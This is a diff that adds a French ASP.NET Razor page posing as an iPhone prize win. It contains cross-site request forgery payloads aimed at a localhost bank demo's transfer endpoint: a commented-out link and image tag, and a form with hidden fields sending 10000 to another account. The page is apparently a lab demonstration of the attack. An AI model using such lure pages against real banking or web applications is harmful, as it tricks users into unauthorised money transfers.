@@ -1,0 +1,21 @@
+﻿@*
+    For more information on enabling MVC for empty projects, visit https://go.microsoft.com/fwlink/?LinkID=397860
+*@
+@{
+}
+
+<h1>Bravo</h1>
+
+<hr />
+
+<p>Vous avez gagné un iPhone !</p>
+
+@* <a href="http://localhost:7458/Bank/Transfer?AccountNo=5789Amount=10000">Cliquez ici!</a>
+
+<img src="http://localhost:7458/Bank/Transfer?AccountNo=5789Amount=10000" /> *@
+
+<!form action="/Bank/Transfer" method="post">
+<input type="hidden" name="AccountNo" value="4785" />
+<input type="hidden" name="Amount" value="10000" />
+<input type="submit" value="Récupérer" />
+</!form>
